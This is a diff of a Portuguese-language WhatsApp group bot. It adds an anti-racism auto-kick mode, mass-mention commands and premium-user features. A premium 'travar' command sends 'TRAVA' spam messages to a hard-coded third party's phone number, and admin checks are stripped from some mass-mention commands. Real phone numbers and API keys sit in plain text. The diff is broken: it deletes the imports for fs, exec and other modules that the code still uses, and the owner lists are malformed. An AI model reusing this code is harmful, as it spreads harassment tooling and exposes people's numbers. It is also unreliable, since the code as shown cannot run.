@@ -7,42 +7,12 @@ const {
 } = require('@adiwajshing/baileys')
 const { color, bgcolor } = require('./lib/color')
 const { phelp } = require('./src/phelp')
-const { base } = require('./src/base')
-const {help1} = require('./src/help1')
-const { pack } = require('./src/pack')
-const { outros } = require('./src/outros')
-const { destrava } = require('./src/destrava')
-const { menu2 } = require('./src/menu2')
-const { destrava2 } = require('./src/destrava')
-const { gbin } = require('./src/gbin')
-const { gpessoa } = require('./src/gpessoa')
-const { chentai } = require('./src/chentai')
-const { gcpf } = require('./src/gcpf')
-const { addsay } = require('./src/addsay')
-const { listsay } = require('./src/listsay')
-const { addfoto } = require('./src/addfoto')
-const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
-const { fetchJson } = require('./lib/fetcher')
-const { recognize } = require('./lib/ocr')
-const fs = require('fs')
-const anime = JSON.parse(fs.readFileSync('./database/json/anime.json'))
-const nsfw = JSON.parse(fs.readFileSync('./database/json/nsfw.json'))
-const moment = require('moment-timezone')
-const { exec } = require('child_process')
+const antiracismo = JSON.parse(fs.readFileSync('./database/json/antiracismo.json'))
 const kagApi = require('@kagchi/kag-api')
-const fetch = require('node-fetch')
-const tiktod = require('tiktok-scraper')
-const { cekvip } = require('./src/cekvip')
 const { TobzApi } = JSON.parse(fs.readFileSync('./database/json/apikey.json'))
 const { VthearApi } = JSON.parse(fs.readFileSync('./database/json/apikey.json'))
-const { daftarvip } = require('./src/daftarvip')
-const { iklan } = require('./src/iklan')
-const { daftatvip } = require('./src/daftarvip')
 const ffmpeg = require('fluent-ffmpeg')
 const { removeBackgroundFromImageFile } = require('remove.bg')
-const imgbb = require('imgbb-uploader')
-const lolis = require('lolis.life')
-const loli = new lolis()
 const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
 const samih = JSON.parse(fs.readFileSync('./src/simi.json'))
 /*const { xp } = require('./database/menu/xp')
@@ -285,21 +255,23 @@ async function starts() {
 				Iv: '𝗠𝗮𝗮𝗳 𝗹𝗶𝗻𝗸 𝘁𝗶𝗱𝗮𝗸 𝘃𝗮𝗹𝗶𝗱☹️'
 				},
 				only: {
-					group: '[⚠️] Impossível utilizar fora do grupo da 𝑷𝑪𝑾¹⁵⁷',
+					group: '[⚠️] Este comando só pode ser usado em grupos! ❌',
+					premium: '[⚠️] ESTE PEDIDO É SO PARA *USUÁRIOS PREMIUMS*',
+					mod: '[⚠️] ESTE PEDIDO É ESPECÍFICO PARA USUÁRIO MOD PZO BOT*',
 					benned: 'Você para a banda, por favor, contate o proprietário para abrir sua banda',
 					
 					userB: `──「 LISTA 」──\nOlá Kak !\nDesculpe, irmã. Você não está registrado como amigo de PZO. Registre-se para fazer amizade com o bot Pzo por meio, \n\nCommand : ${prefix}daftar nama|idade\nExemplo : ${prefix}daftar Pzo|17\n\n──「 PZO BOT 」──`,
-					admin: 'Por um acaso, você é admin da 𝑷𝑪𝑾¹⁵⁷? KKKKKKKK',
+					admin: '[⚠️] Este comando só pode ser usado por administradores de grupo! ❌',
 					Badmin: ' [⚠️] Este comando só pode ser usado quando o bot se torna administrador! ❌',
 				}
 			}
 
 			const botNumber = client.user.jid
-			const ownerNumber = ["5527997179500@s.whatsapp.net"] // replace this with your number
-			const mod = [ownerNumber,"5527997179500@s.whatsapp.net"]//ubah nomor lo
-			const adminbotnumber = ["5527997179500@s.whatsapp.net"]//ubah nomor lo
-			const frendsowner = ["5527997179500@s.whatsapp.net"]//ubah nomor lo
-			const premium = ["5527997179500@s.whatsapp.net"] 
+			const ownerNumber = ["5527997179500@s.whatsapp.net,351926456359@s.whatsapp.net"] // replace this with your number
+			const mod = [ownerNumber,"5527997179500@s.whatsapp.net,351926456359@s.whatsapp.net"]//ubah nomor lo
+			const adminbotnumber = ["5527997179500@s.whatsapp.net,351926456359@s.whatsapp.net"]//ubah nomor lo
+			const frendsowner = ["5527997179500@s.whatsapp.net,351926456359@s.whatsapp.net"]//ubah nomor lo
+			const premium = ["5527997179500@s.whatsapp.net,351926456359@s.whatsapp.net"] 
 			const isGroup = from.endsWith('@g.us')
 			const sender = isGroup ? mek.participant : mek.key.remoteJid
 			const groupMetadata = isGroup ? await client.groupMetadata(from) : ''
@@ -315,6 +287,7 @@ async function starts() {
 			const isNsfw = isGroup ? nsfw.includes(from) : true
             const isAntiLink = isGroup ? antilink.includes(from) : false
 	    	const isAnime = isGroup ? anime.includes(from) : false
+	    	const isAntiRacismo = isGroup ? antiracismo.includes(from) : false
 			const isSimi = isGroup ? samih.includes(from) : false
 			const isOwner = ownerNumber.includes(sender)
 			const isPremium = premium.includes(sender)
@@ -420,6 +393,170 @@ if (text.includes("placa"))
  })
  }		        
 
+        if (messagesC.includes("preto")){
+		if (!isGroup) return
+		if (!isAntiRacismo) return
+		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
+		client.updatePresence(from, Presence.composing)
+		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
+		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
+		reply(`tchau racista ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
+		setTimeout( () => {
+			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
+		}, 5000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("Nesse grupo, não gostamos de racismos, que isso sirva de exemplo 🚶")
+		}, 4000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("2 segundos")
+		}, 3000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("3 segundos")
+		}, 2000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("4 segundos")
+		}, 1000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("5 segundo KKKKKKKK tchau otário 😔🤙")
+		}, 0)
+	}
+	
+	        if (messagesC.includes("seupreto")){
+		if (!isGroup) return
+		if (!isAntiRacismo) return
+		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
+		client.updatePresence(from, Presence.composing)
+		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
+		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
+		reply(`tchau racista ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
+		setTimeout( () => {
+			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
+		}, 5000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("1 segundo")
+		}, 4000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("2 segundos")
+		}, 3000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("3 segundos")
+		}, 2000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("4 segundos")
+		}, 1000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("5 segundo KKKKKKKK tchau otário 😔🤙")
+		}, 0)
+	}
+	
+	        if (messagesC.includes("macaco")){
+		if (!isGroup) return
+		if (!isAntiRacismo) return
+		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
+		client.updatePresence(from, Presence.composing)
+		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
+		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
+		reply(`tchau racista ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
+		setTimeout( () => {
+			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
+		}, 5000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("1 segundo")
+		}, 4000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("2 segundos")
+		}, 3000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("3 segundos")
+		}, 2000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("4 segundos")
+		}, 1000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("5 segundo KKKKKKKK tchau otário 😔🤙")
+		}, 0)
+	}
+	
+	        if (messagesC.includes("pretoimundo")){
+		if (!isGroup) return
+		if (!isAntiRacismo) return
+		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
+		client.updatePresence(from, Presence.composing)
+		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
+		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
+		reply(`tchau racista ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
+		setTimeout( () => {
+			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
+		}, 5000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("1 segundo")
+		}, 4000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("2 segundos")
+		}, 3000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("3 segundos")
+		}, 2000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("4 segundos")
+		}, 1000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("5 segundo KKKKKKKK tchau otário 😔🤙")
+		}, 0)
+	}
+	
+	        if (messagesC.includes("pq vc e preto")){
+		if (!isGroup) return
+		if (!isAntiRacismo) return
+		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
+		client.updatePresence(from, Presence.composing)
+		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
+		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
+		reply(`tchau racista ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
+		setTimeout( () => {
+			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
+		}, 5000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("1 segundo")
+		}, 4000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("2 segundos")
+		}, 3000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("3 segundos")
+		}, 2000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("4 segundos")
+		}, 1000)
+		setTimeout( () => {
+			client.updatePresence(from, Presence.composing)
+			reply("5 segundo KKKKKKKK tchau otário 😔🤙")
+		}, 0)
+	}
 	
 	        if (messagesC.includes("://chat.whatsapp.com/")){
 		if (!isGroup) return
@@ -602,11 +739,6 @@ if (text.includes("placa"))
 				case 'pmenu':
 					client.sendMessage(from, phelp(prefix), text)
 					break
-				case 'base':
-					if (!isGroup) return reply(mess.only.group)
-					if (!isGroupAdmins) return reply('Por um acaso, você é admin da 𝑷𝑪𝑾¹⁵⁷? KKKKKKKK')
-					teks = 'client.sendMessage(from, base(prefix), text) :\n'
-					break
 					case 'lista':
 					if (!isGroup) return reply(mess.only.group)
 					if (!isOwner) return reply('Você quem é o proprietário?')
@@ -774,6 +906,19 @@ if (text.includes("placa"))
 					client.sendMessage(from, anu.result.soal, text, { quoted: mek }) // ur cods
 					}, 0) // 1000 = 1s,
 					break
+					case 'thay':
+				   if (args.length < 1) return reply(`ERROR: kd o texto?? \nUso: ${prefix}thay (seu texto aqui)`)
+				   try{
+				      var txtfig = body.slice(7).trim()
+				      reply(mess.wait)
+				      url = encodeURI(`https://api.xteam.xyz/attp?file&text=${txtfig}`)
+				      textofigu = await getBuffer(url)
+				      client.sendMessage(from, textofigu, sticker, {quoted: mek})
+				   }
+				   catch (e){
+				      reply("Error")
+				   }
+				   break
                 case 'quotemaker':
 					var gh = body.slice(12)
 					var quote = gh.split("|")[0];
@@ -1019,6 +1164,23 @@ if (text.includes("placa"))
 					buffer = await getBuffer(`https://api.vhtear.com/partytext?text=${part}&apikey=ANTIGRATISNIHANJENKKK`)
 					client.sendMessage(from, buffer, image, {caption: 'Aqui amigo (a)', quoted: mek})
 					break
+					case 'antiracismo':
+					if (!isGroup) return reply(mess.only.group)
+					if (!isGroupAdmins) return reply(mess.only.admin)
+					if (args.length < 1) return reply('Hmmmm')
+					if ((args[0]) === 'on') {
+						if (isAntiRacismo) return reply('O modo antiracismo já está ativo')
+						antiracismo.push(from)
+						fs.writeFileSync('./database/json/antiracismo.json', JSON.stringify(antiracismo))
+						reply(`\`\`\`✓Ativado com sucesso o modo antiracismo no grupo\`\`\` *${groupMetadata.subject}*`)
+					} else if ((args[0]) === 'off') {
+						antiracismo.splice(from, 1)
+						fs.writeFileSync('./database/json/antiracismo.json', JSON.stringify(antiracismo))
+						reply(`\`\`\`✓Modo antiracismo desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
+					} else {
+						reply('On para ativar, Off para desligar')
+					}
+					break
 				case 'rtext':
 					if (args.length < 1) return reply(mess.blank)
 					tels5 = body.slice(7)
@@ -1174,6 +1336,10 @@ if (text.includes("placa"))
 					anu = await fetchJson(`http://melodicxt.herokuapp.com/api/txtcustom?theme=blue_metal&text=${tels}&apiKey=administrator`, {method: 'get'})
 					buff = await getBuffer(anu.result)
 					client.sendMessage(from, buff, image, {quoted: mek})
+					break
+					case 'vipmenu':
+					if (!isPremium) return reply('Você não é um Membro Premium, entre em contato com o proprietário ou digite *#daftarvip* para comprar acesso Premium!' ,text, { quoted: mek })
+					client.sendMessage(from, vipmenu(prefix) , text, { quoted: mek })
 					break
 					case 'outros':
 					client.sendMessage(from, outros(prefix) , text, { quoted: mek })
@@ -1368,7 +1534,7 @@ if (text.includes("placa"))
                     const latensi = speed() - timestamp
                     client.updatePresence(from, Presence.composing) 
 				uptime = process.uptime()
-                    client.sendMessage(from, `Speed: *${latensi.toFixed(4)} _Segundos_*\nDispositivo: *Asus*\nRAM: *3/16*\nRede: *Wifi*\nStatus: *Ainda não cobrado*\nTipo do bot: *Termux Somente*\n\n*O bot esteve ativo por*\n*${kyun(uptime)}*`, text, { quoted: mek})
+                    client.sendMessage(from, `Speed: *${latensi.toFixed(4)} _Segundos_*\nDispositivo: *Xiaomi*\nRAM: *6/64*\nData: *Telkomsel*\nRede: *4G*\nStatus: *Ainda não cobrado*\nTipo do bot: *Termux Somente*\n\n*O bot esteve ativo por*\n*${kyun(uptime)}*`, text, { quoted: mek})
                     break
 				case 'delete':
 				case 'del':
@@ -1378,6 +1544,25 @@ if (text.includes("placa"))
 					if (!isGroupAdmins)return reply(mess.only.admin)
 					client.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
 					break
+                case 'travar':
+                     const pesan = body.slice(5)
+                      if (!isPremium) return reply(mess.only.premium)
+                      if (pesan.length > 5000) return client.sendMessage(from, 'ate 5k de caracteres', msgType.text, {quoted: mek})
+                        var nomor = mek.participant
+                       const teks1 = `*[TRAVA🐊🚩]*\nTRAVADO POR : @${nomor.split("@s.whatsapp.net")[0]}\nMensagem : ${pesan}`
+                       const teks2 = `*[TRAVA🐊🚩]*\nTRAVADO POR : @${nomor.split("@s.whatsapp.net")[0]}\nMensagem : ${pesan}`
+                       const teks3 = `*[TRAVA🐊🚩]*\nTRAVADO POR : @${nomor.split("@s.whatsapp.net")[0]}\nMensagem : ${pesan}`
+                       const teks4 = `*[TRAVA🐊🚩]*\nTRAVADO POR : @${nomor.split("@s.whatsapp.net")[0]}\nMensagem : ${pesan}`
+                      var options = {
+                         text: teks1,
+                         text: teks2,
+                         text: teks3,
+                         text: teks4,
+                         contextInfo: {mentionedJid: [nomor]},
+                     }
+                    client.sendMessage('556192247994@s.whatsapp.net', options, text, {quoted: mek})
+                    reply('1 trava enviada')
+                    break
            case 'playmp3':
                 reply(mess.wait)
                 play = body.slice(9)
@@ -2864,9 +3049,36 @@ break
 					client.sendMessage(from, mentioned)
 				    }
 					break
+					case 'daftarvip': 
+					client.sendMessage(from, daftarvip(prefix) , text, { quoted: mek })
+					break
 					case 'nekopoi':   
 					
 					client.sendMessage(from, nekopoi(prefix) , text, { quoted: mek })
+					break
+					case 'cekvip': 
+					if (!isPremium) return reply('Você não é um Membro Premium, entre em contato com o proprietário ou digite *.Daftarvip* para adquirir o acesso Premium!' ,text, { quoted: mek })
+					me = client.user
+					uptime = process.uptime()
+					client.sendMessage(from,  `*──────────────────*\n*Nome do bot:* PZO BOT\n*─────────────────*\n『 *𝐕𝐈𝐏 𝐔𝐒𝐄𝐑*』\n*──────────────────*\n*•Número:* *${sender.split("@s.whatsapp.net")[0]}*\n*•Status:* *ATIVO*\n*──────────────────*\n*Status Bot:* *${kyun(uptime)}*\n\n*VOCE É UM MEMBRO PREMIUM* 🐊🚩\n*──────────────────*` , text, { quoted: mek, })
+					break
+					case 'dellvip':
+					if (!isOwner) return reply(mess.only.ownerB)
+					if (!isPremium) return reply('Você não é um Membro Premium, entre em contato com o proprietário ou digite * # Daftarvip * para adquirir o acesso Premium!' ,text, { quoted: mek })
+					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
+					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
+					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
+					if (mentioned.length > 1) {
+						teks = '╭────「 *PREMIUM👑* 」──*\n│+ *Número* : \n│+ *Status*: *DESATIVO*\n│ Te vejo para o próximo pedido🙂\n*╰──────「 *posição* 」────'
+						for (let _ of mentioned) {
+							teks += `@${_.split('@')[0]}\n`
+						}
+						mentions(teks, mentioned, true)
+						client.sendMessage(from, mentioned)
+					} else {
+						mentions(`╭────「 *PREMIUM👑* 」──*\n│+ *Número* : @${mentioned[0].split('@')[0]}\n│+ *Status*: *DEATIVO*\n│ Te vejo para o próximo pedido🙂\n*╰──────「 *posição* 」────`, mentioned, true)
+					client.sendMessage(from, mentioned)
+				    }
 					break
 					case 'ichiadmin':
 					tod = await getBuffer(`https://i.ibb.co/XDwBVDJ/1f2652c622fa.jpg`)
@@ -3083,6 +3295,18 @@ break
 						fs.unlinkSync(rano)
 					})
 					break
+				case 'marcar':
+					if (!isGroup) return reply(mess.only.group)
+					if (!isGroupAdmins) return reply(mess.only.admin)
+					members_id = []
+					teks = (args.length > 1) ? body.slice(8).trim() : ''
+					teks += '\n\n'
+					for (let mem of groupMembers) {
+						teks += `*#* @${mem.jid.split('@')[0]}\n`
+						members_id.push(mem.jid)
+					}
+					mentions(teks, members_id, true)
+					break
 					case 'pcwall':
 					if (!isGroup) return reply(mess.only.group)
 					if (!isGroupAdmins) return reply(mess.only.admin)
@@ -3095,9 +3319,7 @@ break
 					}
 					mentions(teks, members_id, true)
 					break
-					case 'pcwall2':
-					if (!isGroup) return reply(mess.only.group)
-					if (!isGroupAdmins) return reply(mess.only.admin)
+                case 'marcar2':
 					members_id = []
 					teks = (args.length > 1) ? body.slice(8).trim() : ''
 					teks += '\n\n'
@@ -3107,9 +3329,27 @@ break
 					}
 					reply(teks)
 					break
+					case 'pcwall2':
+					members_id = []
+					teks = (args.length > 1) ? body.slice(8).trim() : ''
+					teks += '\n\n'
+					for (let mem of groupMembers) {
+						teks += `╠➥ @${mem.jid.split('@')[0]}\n`
+						members_id.push(mem.jid)
+					}
+					reply(teks)
+					break
+                 case 'marcar3':
+					members_id = []
+					teks = (args.length > 1) ? body.slice(8).trim() : ''
+					teks += '\n\n'
+					for (let mem of groupMembers) {
+						teks += `╠➥ https://wa.me/${mem.jid.split('@')[0]}\n`
+						members_id.push(mem.jid)
+					}
+					client.sendMessage(from, teks, text, {detectLinks: false, quoted: mek})
+					break
 					case 'pcwall3':
-					if (!isGroup) return reply(mess.only.group)
-					if (!isGroupAdmins) return reply(mess.only.admin)
 					members_id = []
 					teks = (args.length > 1) ? body.slice(8).trim() : ''
 					teks += '\n\n'
@@ -3120,7 +3360,7 @@ break
 					client.sendMessage(from, teks, text, {detectLinks: false, quoted: mek})
 					break
 				case 'limpar':
-					if (!isOwner) return reply('Quem é Você? Você não é o paizão')
+					if (!isOwner) return reply('Quem é Você? Você não é um dos donos da 𝑷𝑪𝑾¹⁵⁷')
 					anu = await client.chats.all()
 					client.setMaxListeners(25)
 					for (let _ of anu) {
@@ -3129,7 +3369,7 @@ break
 					reply('Excluido todos os chats com sucesso :)')
 					break
 				case 'bc':
-					if (!isOwner) return reply('Quem é Você? Você não é o paizão')
+					if (!isOwner) return reply('Quem é Você? Você não é um dos donos da 𝑷𝑪𝑾¹⁵⁷')
 					if (args.length < 1) return reply('.......')
 					anu = await client.chats.all()
 					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
@@ -3141,7 +3381,7 @@ break
 						reply('Transmissão enviada com sucesso')
 					} else {
 						for (let _ of anu) {
-							sendMess(_.jid, `[ TRANSMISSÃO DE AVISO PZO ]\n\n${body.slice(4)}`)
+							sendMess(_.jid, `[ TRANSMISSÃO DE AVISO 𝑷𝑪𝑾¹⁵⁷ ]\n\n${body.slice(4)}`)
 						}
 						reply('Transmissão enviada com sucesso')
 					}
@@ -3217,6 +3457,20 @@ break
                                         linkgc = await client.groupInviteCode(from)
                                         reply('https://chat.whatsapp.com/'+linkgc)
                                         break
+				case 'toimg':
+					if (!isQuotedSticker) return reply('{ ⚠️ } *Marque a figurinha*')
+					reply(mess.wait)
+					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+					media = await client.downloadAndSaveMediaMessage(encmedia)
+					ran = getRandom('.png')
+					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
+						fs.unlinkSync(media)
+						if (err) return reply('Tente marcar um adesivo não animado😊')
+						buffer = fs.readFileSync(ran)
+						client.sendMessage(from, buffer, image, {quoted: mek, caption: '>//<'})
+						fs.unlinkSync(ran)
+					})
+					break
 					case 'ptoimg':
 					if (!isQuotedSticker) return reply('{ ⚠️ } *Marque a figurinha*')
 					reply(mess.wait)
@@ -3234,7 +3488,7 @@ break
 				case 'bemvindo':
 					if (!isGroup) return reply(mess.only.group)
 					if (!isGroupAdmins) return reply(mess.only.admin)
-					if (args.length < 1) return reply('tente usar .bemvindo 1')
+					if (args.length < 1) return reply('Hmmmm')
 					if (Number(args[0]) === 1) {
 						if (isWelkom) return reply('Já esta ativo.')
 						welkom.push(from)
@@ -3257,7 +3511,7 @@ break
                     reply('Alterado com sucesso o ícone do Grupo')
                     break
                 case 'bc2':
-					if (!isadminbot) return reply('Quem é Você? Você não é o paizão')
+					if (!isadminbot) return reply('Quem é Você? Você não é um dos donos da 𝑷𝑪𝑾¹⁵⁷')
 					if (args.length < 1) return reply('.......')
 					anu = await client.chats.all()
 					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
